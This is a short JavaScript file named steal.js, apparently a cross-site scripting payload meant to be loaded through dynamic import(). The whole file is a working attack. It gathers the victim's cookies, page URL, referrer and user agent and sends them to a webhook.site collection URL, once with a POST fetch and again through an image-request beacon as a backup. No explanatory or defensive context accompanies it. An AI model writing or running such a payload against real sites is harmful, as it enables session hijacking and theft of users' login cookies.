// steal.js - For dynamic import() XSS
export default function() {
    const data = {
        cookies: document.cookie || "no-cookies",
        url: location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        time: new Date().toISOString()
    };

    // Send to webhook.site
    fetch('https://webhook.site/db2682da-2c95-4068-9663-e64473df3067', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data)
    }).catch(() => {});

    // Backup method
    new Image().src = `https://webhook.site/db2682da-2c95-4068-9663-e64473df3067?c=${encodeURIComponent(document.cookie)}&u=${encodeURIComponent(location.href)}`;
}
